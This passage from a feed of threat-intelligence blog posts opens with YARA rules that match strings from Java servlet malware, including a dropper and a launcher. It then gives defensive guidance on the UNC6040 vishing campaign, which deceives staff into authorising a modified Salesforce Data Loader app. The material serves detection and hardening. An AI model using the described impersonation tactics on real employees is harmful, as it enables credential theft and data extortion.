Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$str1 = \"ServletRequestImpl\" base64\n\t\t$str2 = \"getServletRequest\" base64\n\t\t$str3 = \"ServletResponseImpl\" base64\n\t\t$str4 = \"dc=cl.getDeclaredMethod('defineClass',[cb,ci,ci])\" base64\n\t\t$decoded1 = \"ServletRequestImpl\"\n\t\t$decoded2 = \"getServletRequest\"\n\t\t$decoded3 = \"ServletResponseImpl\"\n\t\t$decoded4 = \"dc=cl.getDeclaredMethod('defineClass',[cb,ci,ci])\"\n\tcondition:\n\t\tall of ($str*) or all of ($decoded*)\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Dropper_SAGELEAF_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$log1 = \"n1=%d n2=%d\"\n\t\t$log2 = \"ctx.l=%d\"\n\t\t$log3 = \"Filter=\" fullword\n\t\t$pat = \"/help/*\"\n\t\t$s1 = \"weblogic.t3.srvr.ServerRuntime\"\n\t\t$s2 = \"gzipDecompress\"\n\t\t$s3 = \"BASE64Decoder\"\n\t\t$s4 = \"getDeclaredMethod\"\n\tcondition:\n\t\t2 of ($log*) and 5 of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Launcher_SAGEWAVE_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$s1 = \"Log4jConfigQpgsubFilter\"\n\t\t$s2 = \".Cli\" fullword\n\t\t$s3 = \"httpReq\" fullword\n\t\t$s4 = \"AES/CBC/NoPadding\"\n\t\t$s5 = \"javax/servlet/FilterChain\"\n\t\t$s6 = \"java/lang/reflect/Method\"\n\tcondition:\n\t\t4 of ($s*) and filesize &lt; 1MB\n}</code></pre></div>"}
{"source": "Threat Intelligence", "title": "Cybercrime Observations from the Frontlines: UNC6040 Proactive Hardening Recommendations", "link": "https://cloud.google.com/blog/topics/threat-intelligence/unc6040-proactive-hardening-recommendations/", "published": "Tue, 30 Sep 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p><strong>Written by:</strong> Omar ElAhdan, Matthew McWhirt, Michael Rudden, Aswad Robinson, Bhavesh Dhake, Laith Al</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Background</span></h3>\n<p><span style=\"vertical-align: baseline;\">Protecting software-as-a-service (SaaS) platforms and applications requires a comprehensive security strategy. Drawing from analysis of UNC6040’s specific attack methodologies, this guide presents a structured defensive framework encompassing proactive hardening measures, comprehensive logging protocols, and advanced detection capabilities. While emphasizing Salesforce-specific security recommendations, these strategies provide organizations with actionable approaches to safeguard their SaaS ecosystem against current threats.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group (GTIG) is tracking UNC6040, a financially motivated threat cluster that specializes in voice phishing (vishing) campaigns specifically designed to compromise organizations' Salesforce instances for large-scale data theft and subsequent extortion. Over the past several months, UNC6040 has demonstrated repeated success in breaching networks by having its operators impersonate IT support personnel in convincing telephone-based social engineering engagements. This approach has proven particularly effective in tricking employees, often within English-speaking branches of multinational corporations, into actions that grant the attackers access or lead to the sharing of sensitive credentials, ultimately facilitating the theft of organization’s Salesforce data. In all observed cases, attackers relied on manipulating end users, not exploiting any vulnerability inherent to Salesforce.</span></p>\n<p><span style=\"vertical-align: baseline;\">A prevalent tactic in UNC6040's operations involves deceiving victims into authorizing a malicious connected app to their organization's Salesforce portal. This application is often a modified version of Salesforce’s Data Loader, not authorized by Salesforce. During a vishing call, the actor guides the victim to visit Salesforce's connected app setup page to approve a version of the Data Loader app with a name or branding that differs from the legitimate version. This step inadvertently grants UNC6040 significant capabilities to access, query, and exfiltrate sensitive information directly from the compromised Salesforce customer environments. This methodology of abusing Data Loader functionalities via malicious connected apps is consistent with recent observations detailed by Salesforce in their guidance on protecting Salesforce environments from such threats.</span></p>\n<p><span style=\"vertical-align: baseline;\">In some instances, extortion activities haven't been observed until several months after the initial UNC6040 intrusion activity, which could suggest that UNC6040 has partnered with a second threat actor that monetizes access to the stolen data. During these extortion attempts, the actor has claimed affiliation with the well-known hacking group ShinyHunters, likely as a method to increase pressure on their victims.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"attack-flow-unc6040-hardening\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/attack-flow-unc6040-hardening.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Data Loader attack flow</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We have observed the following patterns in UNC6040 victimology:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Motive:</strong><span style=\"vertical-align: baseline;\"> UNC6040 is a financially motivated threat cluster that accesses victim networks by vishing social engineering.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Focus:</strong><span style=\"vertical-align: baseline;\"> Upon obtaining access, UNC6040 has been observed immediately exfiltrating data from the victim’s Salesforce environment using Salesforce’s Data Loader application. Following this initial data theft, UNC6040 was observed leveraging end-user credentials obtained through credential harvesting or vishing to move laterally through victim networks, accessing and exfiltrating data from the victim's accounts on other cloud platforms such as Okta and Microsoft 365.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Attacker infrastructure:</strong><span style=\"vertical-align: baseline;\"> UNC6040 primarily used Mullvad VPN IP addresses to access and perform the data exfiltration on the victim’s Salesforce environments and other services of the victim's network.</span></p>\n</li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Proactive Hardening Recommendations</span></h3>\n<p><span style=\"vertical-align: baseline;\">The following section provides prioritized recommendations to protect against tactics utilized by UNC6040. This section is broken down to the following categories: </span></p>\n<ol>\n<li><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/unc6040-proactive-hardening-recommendations#:~:text=1.%20identity\"><span style=\"vertical-align: baseline;\">Identity</span></a>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Help Desk and End User Verification </span></li>\n<li><span style=\"vertical-align: baseline;\">Identity Validation and Protections </span></li>\n</ul>\n</li>\n<li><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/unc6040-proactive-hardening-recommendations#:~:text=2.%20saas%20applications\">SaaS Applications</a>\n<ul>\n<li><span style=\"vertical-align: baseline;\">SaaS Application (e.g., Salesforce) Hardening Measures </span></li>\n</ul>\n</li>\n<li><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/unc6040-proactive-hardening-recommendations#:~:text=3.%20logging%20and%20detections\">Logging and Detections</a></li>\n</ol>\n<p><strong style=\"vertical-align: baseline;\">Note: </strong><span style=\"vertical-align: baseline;\">While the following recommendations include strategies to protect SaaS applications, they also cover identity security controls and detections applicable at the Identity Provider (IdP) layer and security enhancements for existing processes, such as the help desk.</span></p>\n<h4><span style=\"vertical-align: baseline;\">1. Identity</span></h4>\n<h5><span style=\"vertical-align: baseline;\">Positive Identity Verification</span></h5>\n<p><span style=\"vertical-align: baseline;\">To protect against increasingly sophisticated social engineering and credential compromise attacks, organizations must adopt a robust, multilayered process for identity verification. This process moves beyond outdated, easily compromised methods and establishes a higher standard of assurance for all support requests, especially those involving account modifications (e.g., password resets or multi-factor authentication modifications).</span></p>\n<h5><span style=\"vertical-align: baseline;\">Guiding Principles</span></h5>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Assume nothing:</strong><span style=\"vertical-align: baseline;\"> Do not inherently trust the caller's stated identity. Verification is mandatory for all security-related requests.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Defense-in-depth:</strong><span style=\"vertical-align: baseline;\"> Rely on a combination of verification methods. No single factor should be sufficient for high-risk actions.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Reject unsafe identifiers:</strong><span style=\"vertical-align: baseline;\"> Avoid relying on publicly available or easily discoverable data. Information such as:</span>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Date of birth</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Last four digits of a Social Security number</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">High school names</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Supervisor names</span></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This data should not be used as primary verification factors, as it's often compromised through data breaches or obtainable via open source intelligence (OSINT).</span></p>\n<h5><span style=\"vertical-align: baseline;\">Standard Verification Procedures</span></h5>\n<h6><span style=\"vertical-align: baseline;\">Live Video Identity Proofing (Primary Method)</span></h6>\n<p><span style=\"vertical-align: baseline;\">This is the most reliable method for identifying callers. The help desk agent must:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Initiate a video call with the user</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Require the user to present a valid corporate badge or government-issued photo ID (e.g., driver's license) on camera next to their face</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Visually confirm that the person on the video call matches the photograph on the ID</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Cross-reference the user's face with their photo in the internal corporate identity system</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Verify that the name on the ID matches the name in the employee's corporate record<br /></span><span style=\"vertical-align: baseline;\"><br /></span><strong style=\"vertical-align: baseline;\">Contingency for No Video:</strong><span style=\"vertical-align: baseline;\"> If a live video call is not possible, the user must provide a selfie showing their face, their photo ID, and a piece of paper with the current date and time written on it.<br /><br /></span>Additionally, before proceeding with any request - help desk personnel must check the user's calendar for Out of Office (OOO) or vacation status. All requests from users who are marked as OOO should be presumptively denied until they have officially returned.</p>\n</li>\n</ol>\n<h6><span style=\"vertical-align: baseline;\">Out-of-Band (OOB) Verification (For High-Risk Requests)</span></h6>\n<p><span style=\"vertical-align: baseline;\">For high-risk changes like multi-factor authentication (MFA) resets or password changes for privileged accounts, an additional OOB verification step is required </span><span style=\"font-style: italic; vertical-align: baseline;\">after</span><span style=\"vertical-align: baseline;\"> the initial ID proofing. This can include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Call-back:</strong><span style=\"vertical-align: baseline;\"> Placing a call to the user's registered phone number on file</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Manager approval:</strong><span style=\"vertical-align: baseline;\"> Sending a request for confirmation to the user's direct manager via a verified corporate communication channel</span></p>\n</li>\n</ul>\n<h6><span style=\"vertical-align: baseline;\">Special Handling for Third-Party Vendor Requests</span></h6>\n<p><span style=\"vertical-align: baseline;\">Mandiant has observed incidents where attackers impersonate support personnel from third-party vendors to gain access. In these situations, the standard verification principals may not be applicable.</span></p>\n<p><span style=\"vertical-align: baseline;\">Under no circumstances should the Help Desk move forward with allowing access. The agent must halt the request and follow this procedure:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">End the inbound call without providing any access or information</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Independently contact the company's designated </span><strong style=\"vertical-align: baseline;\">account manager</strong><span style=\"vertical-align: baseline;\"> for that vendor using trusted, on-file contact information</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Require explicit verification from the account manager before proceeding with any request</span></p>\n</li>\n</ol>\n<h6><span style=\"vertical-align: baseline;\">Outreach to End Users </span></h6>\n<p><span style=\"vertical-align: baseline;\">Mandiant has observed the threat actor UNC6040 targeting end-users who have elevated access to SaaS applications. Posing as vendors or support personnel, UNC6040 contacts these users and provides a malicious link. Once the user clicks the link and authenticates, the attacker gains access to the application to exfiltrate data.</span></p>\n<p><span style=\"vertical-align: baseline;\">To mitigate this threat, organizations should rigorously communicate to all end-users the importance of verifying any third-party requests. Verification procedures should include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Hanging up and calling the official account manager using a phone number on file</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Requiring the requester to submit a ticket through the official company support portal</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Asking for a valid ticket number that can be confirmed in the support console</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Organizations should also provide a clear and accessible process for end-users to report suspicious communications and ensure this reporting mechanism is included in all security awareness outreach.</span></p>\n<p><span style=\"vertical-align: baseline;\"><a href=\"https://www.salesforce.com/blog/protect-against-social-engineering/\" rel=\"noopener\" target=\"_blank\">Salesforce has additional guidance</a> that can be referenced.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Identity Protections</span><strong style=\"vertical-align: baseline;\"> </strong></h5>\n<p><span style=\"vertical-align: baseline;\">Since access to SaaS applications is typically managed by central identity providers (e.g., Entra ID, Okta), Mandiant recommends that organizations enforce unified identity security controls directly within these platforms. </span></p>\n<h5><span style=\"vertical-align: baseline;\">Guiding Principles</span></h5>\n<p><span style=\"vertical-align: baseline;\">Mandiant’s approach focuses on the following core principles:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Authentication boundary</strong><span style=\"vertical-align: baseline;\"> This principle establishes a foundational layer of trust based on network context. Access to sensitive resources should be confined within a defined boundary, primarily allowing connections from trusted corporate networks and VPNs to create a clear distinction between trusted and untrusted locations.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Defense-in-depth</strong><span style=\"vertical-align: baseline;\"> This principle dictates that security cannot rely on a single control. Organizations should layer multiple security measures,such as strong authentication, device compliance checks, and session controls.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Identity detection and response</strong><span style=\"vertical-align: baseline;\">  Organizations must continuously integrate real-time threat intelligence into access decisions. This ensures that if an identity is compromised or exhibits risky behavior, its access is automatically contained or blocked until the threat has been remediated.</span></p>\n</li>\n</ul>\n<h5><span style=\"vertical-align: baseline;\">Identity Security Controls</span><strong style=\"vertical-align: baseline;\"> </strong></h5>\n<p><span style=\"vertical-align: baseline;\">The following controls are essential for securing access to SaaS applications through a central identity provider.</span></p>\n<h6><span style=\"vertical-align: baseline;\">Utilize Single Sign-On (SSO)</span></h6>\n<p><span style=\"vertical-align: baseline;\">Ensure that all users accessing SaaS applications are accessing via a corporate-managed SSO provider (e.g., Microsoft Entra ID or Okta), rather than through platform-native accounts. A platform-native break glass account should be created and vaulted for use only in the case of an emergency.</span></p>\n<p><span style=\"vertical-align: baseline;\">In the event that SSO through a corporate-managed provider is not available, refer to the content specific to the applicable SaaS application (e.g., Salesforce) rather than Microsoft Entra ID or Okta.</span></p>\n<h6><span style=\"vertical-align: baseline;\">Mandate Phishing-Resistant MFA</span></h6>\n<p><span style=\"vertical-align: baseline;\">Phishing-resistant MFA must be enforced for all users accessing SaaS applications. This is a foundational requirement to defend against credential theft and account takeovers. Consider enforcing physical FIDO2 keys for accounts with privileged access. Ensure that no MFA bypasses exist in authentication policies tied to business critical applications.</span></p>\n<p><span style=\"vertical-align: baseline;\">For Microsoft Entra ID:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">General MFA Policy: </span><a href=\"https://learn.microsoft.com/en-us/entra/identity/conditional-access/howto-conditional-access-policy-all-users-mfa\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Enforce MFA for all users with Conditional Access</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Passkey (FIDO2) Setup:</span> <a href=\"https://learn.microsoft.com/en-us/entra/identity/authentication/how-to-enable-passkey-fido2\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Enable passkey and FIDO2 security keys</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Okta:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Configure FIDO2 (WebAuthn):</span> <a href=\"https://www.google.com/search?q=https://help.okta.com/en-us/Content/Topics/Security/authenticators/configure-fido2.htm\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Set up the FIDO2 (WebAuthn) authenticator</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enforce via Policy:</span> <a href=\"https://www.google.com/search?q=https://help.okta.com/en-us/Content/Topics/Security/policies/configure-app-sign-on-policies.htm\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Create an Authentication Policy to require strong authenticators</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Google Cloud Identity / Workspace:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">General MFA Policy: </span><a href=\"https://support.google.com/a/answer/9176657\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Deploy 2-Step Verification</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Security Key enforcement: </span><a href=\"https://support.google.com/accounts/answer/6103523?sjid=10361293050858076570-NA\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Use a security key for 2-Step Verification</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Salesforce:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">MFA is required by default for local Salesforce accounts: </span><a href=\"https://help.salesforce.com/s/articleView?id=000396727&amp;type=1\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Salesforce Multi-Factor Authentication FAQ</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Configure FIDO2 (WebAuthn): </span><a href=\"https://help.salesforce.com/s/articleView?id=xcloud.security_u2f_register_security_key.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Register a Security Key as an Identity Verification Method for Salesforce Orgs</span></a></p>\n</li>\n</ul>\n<h5><span style=\"vertical-align: baseline;\">Enforce Device Trust and Compliance</span></h5>\n<p><span style=\"vertical-align: baseline;\">Access to corporate applications must be limited to devices that are either domain-joined or verified as compliant with the organization's security standards. This policy ensures that a device meets a minimum security baseline before it can access sensitive data.</span></p>\n<p><span style=\"vertical-align: baseline;\">Key device posture checks should include:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Valid host certificate:</strong><span style=\"vertical-align: baseline;\"> The device must present a valid, company-issued certificate</span></li>\n<li><strong style=\"vertical-align: baseline;\">Approved operating system: </strong><span style=\"vertical-align: baseline;\">The endpoint must run an approved OS that meets current version and patch requirements</span></li>\n<li><strong style=\"vertical-align: baseline;\">Active EDR agent:</strong><span style=\"vertical-align: baseline;\"> The corporate Endpoint Detection and Response (EDR) solution must be installed, active, and reporting a healthy status</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Microsoft Entra ID:</span></p>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Device Compliance Policy:</span> <a href=\"https://learn.microsoft.com/en-us/entra/identity/conditional-access/policy-all-users-device-compliance\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Require compliant devices for all users with Conditional Access</span></a></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Okta:</span></p>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Device Trust Overview:</span> <a href=\"https://www.google.com/search?q=https://help.okta.com/en-us/Content/Topics/Security/devicetrust/device-trust-landing.htm\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Configure Okta Device Trust for managed devices</span></a></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Google Cloud Identity / Workspace:</span></p>\n<ul>\n<li><span style=\"vertical-align: baseline;\">Context-Aware Access: </span><a href=\"https://support.google.com/a/answer/9275380?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Overview of Context-Aware Access</span></a></li>\n<li><span style=\"vertical-align: baseline;\">Endpoint Verification:</span> <a href=\"https://support.google.com/a/answer/9007320\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Monitor and gather details about devices with Endpoint Verification</span></a></li>\n</ul>\n<h5><span style=\"vertical-align: baseline;\">Automate Response to Identity Threats</span></h5>\n<p><span style=\"vertical-align: baseline;\">Mandiant recommends that organizations implement dynamic authentication policies that respond to threats in real time. By integrating identity threat intelligence feeds—from both native platform services and third-party solutions—into the authentication process, organizations can automatically block or challenge access when an identity is compromised or exhibits risky behavior.</span></p>\n<p><span style=\"vertical-align: baseline;\">This approach primarily evaluates two categories of risk:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Risky sign-ins:</strong><span style=\"vertical-align: baseline;\"> The probability that an authentication request is illegitimate due to factors like atypical travel, a malware-linked IP address, or password spray activity</span></li>\n<li><strong style=\"vertical-align: baseline;\">Risky users:</strong><span style=\"vertical-align: baseline;\"> The probability that a user's credential has been compromised or leaked online</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Based on the detected risk level, Mandiant recommends that organizations apply a tiered approach to remediation.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Recommended Risk-Based Actions</span></h5>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">For high-risk events:</strong><span style=\"vertical-align: baseline;\"> Organizations should apply the most stringent security controls. This includes blocking access entirely.</span></li>\n<li><strong style=\"vertical-align: baseline;\">For medium-risk events:</strong><span style=\"vertical-align: baseline;\"> Access should be granted only after a significant step-up in verification. This typically means requiring proof of both the user's identity (via strong MFA) and the device's integrity (by verifying its compliance and security posture).</span></li>\n<li><strong style=\"vertical-align: baseline;\">For low-risk events: </strong><span style=\"vertical-align: baseline;\">Organizations should still require a step-up authentication challenge, such as standard MFA, to ensure the legitimacy of the session and mitigate low-fidelity threats.</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Microsoft Entra ID:</span></p>\n<ul>\n<li><a href=\"https://learn.microsoft.com/en-us/entra/id-protection/overview-identity-protection\" rel=\"noopener\" target=\"_blank\"><strong><span style=\"vertical-align: baseline;\">Overview</span></strong></a></li>\n<li><strong><a href=\"https://learn.microsoft.com/en-us/entra/id-protection/howto-identity-protection-configure-risk-policies\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">Configuration</span></a></strong></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Okta:</span></p>\n<ul>\n<li><strong><a href=\"https://help.okta.com/en-us/content/topics/security/proc-security-behavior-detection.htm\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">Behavior detection</span></a></strong></li>\n<li><strong><a href=\"https://help.okta.com/oie/en-us/content/topics/identity-engine/policies/add-app-sign-on-policy-rule.htm\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">Risk-based policies</span></a></strong></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Google Cloud Identity / Workspace:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Access context manager overview: </strong><a href=\"https://cloud.google.com/access-context-manager/docs/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Use Context-Aware Access to create granular, risk-based access policies</span></a></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For Salesforce Shield: </span></p>\n<ul>\n<li><a href=\"https://help.salesforce.com/s/articleView?id=sf.salesforce_shield.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\"><strong style=\"vertical-align: baseline;\">Overview</strong></a></li>\n<li><strong style=\"vertical-align: baseline;\">Event monitoring:</strong><span style=\"vertical-align: baseline;\"> Provides detailed logs of user actions—such as data access, record modifications, and login origins—and allows these logs to be exported for external analysis</span></li>\n<li><strong style=\"vertical-align: baseline;\">Transaction security policies:</strong><span style=\"vertical-align: baseline;\"> Monitors for specific user activities, such as large data downloads, and can be configured to automatically trigger alerts or block the action when it occurs</span></li>\n</ul></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">2. SaaS Applications</span><strong style=\"vertical-align: baseline;\"> </strong></h4>\n<h5><span style=\"vertical-align: baseline;\">Salesforce Targeted Hardening Controls</span><strong style=\"vertical-align: baseline;\"> </strong></h5>\n<p><span style=\"vertical-align: baseline;\">This section details specific security controls applicable for Salesforce instances. These controls are designed to protect against broad access, data exfiltration, and unauthorized access to sensitive data within Salesforce.</span></p>\n<h5><span style=\"vertical-align: baseline;\">Network and Login Controls</span></h5>\n<p><span style=\"vertical-align: baseline;\">Restrict logins to only originate from trusted network locations.</span></p>\n<p>See <a href=\"https://help.salesforce.com/s/articleView?id=000386441&amp;type=1\" rel=\"noopener\" target=\"_blank\">Salesforce guidance on network access and profile-based IP restrictions</a>.<span style=\"vertical-align: baseline;\"> </span></p>\n<h5><span style=\"vertical-align: baseline;\">Restrict Login by IP Address</span></h5>\n<p><span style=\"vertical-align: baseline;\">This control prevents credential misuse from unauthorized networks, effectively blocking access even if an attacker has stolen valid user credentials.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Define login IP ranges</span><span style=\"vertical-align: baseline;\"> at the profile level to only permit access from corporate and trusted network addresses.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">In Session Settings, enable “Enforce login IP ranges on every request” to ensure the check is not bypassed by an existing session.</span></p>\n</li>\n</ul>\n<p>See <a href=\"https://help.salesforce.com/s/articleView?id=sf.security_networkaccess.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\">Salesforce guidance on setting trusted IP ranges</a>.</p>\n<h5><span style=\"vertical-align: baseline;\">Application and API Access Governance</span></h5>\n<h6><span style=\"vertical-align: baseline;\">Govern Connected App and API Access</span></h6>\n<p><span style=\"vertical-align: baseline;\">Threat actors often bypass interactive login controls by leveraging generic API clients and stolen OAuth tokens. This policy flips the model from \"allow by default\" to \"deny by default,\" to ensure that only vetted applications can connect.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enable a \"Deny by Default\" API policy:</strong><span style=\"vertical-align: baseline;\"> Navigate to API Access Control and enable “For admin-approved users, limit API access to only allowed connected apps.” This blocks all unapproved clients.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Maintain a minimal application allowlist:</strong><span style=\"vertical-align: baseline;\"> Explicitly approve only essential Connected Apps. Regularly review this allowlist to remove unused or unapproved applications.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enforce strict OAuth policies per app:</strong><span style=\"vertical-align: baseline;\"> For each approved app, configure granular security policies, including restricting access to trusted IP ranges, enforcing MFA, and setting appropriate session and refresh token timeouts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Revoke sessions when removing apps:</strong><span style=\"vertical-align: baseline;\"> When revoking an app's access, ensure all active OAuth tokens and sessions associated with it are also revoked to prevent lingering access.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Organizational process and policy: </strong><span style=\"vertical-align: baseline;\">Create policies governing application integrations with third parties. Perform Third-Party Risk Management reviews of all integrations with business-critical applications (e.g., Salesforce, Google Workspace, Workday).</span></p>\n</li>\n</ul>\n<p>See <a href=\"https://help.salesforce.com/s/articleView?language=en_US&amp;id=xcloud.security_api_access_control_about.htm&amp;type=5\" rel=\"noopener\" target=\"_blank\">Salesforce guidance on managing API access</a>.</p>\n<h5><span style=\"vertical-align: baseline;\">User Privilege and Access Management</span></h5>\n<h6><span style=\"vertical-align: baseline;\">Implement the Principle of Least Privilege</span></h6>\n<p><span style=\"vertical-align: baseline;\">Users should only be granted the absolute minimum permissions required to perform their job functions.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Use a \"Minimum Access\" profile as a baseline:</strong><span style=\"vertical-align: baseline;\"> Configure a base profile with minimal permissions and assign it to all new users by default. Limit the assignment of  \"View All\" and \"Modify All\" permissions</span><strong style=\"vertical-align: baseline;\">.</strong><span style=\"vertical-align: baseline;\"> </span></p>\n</li>\n<li style=\"vertical-align: 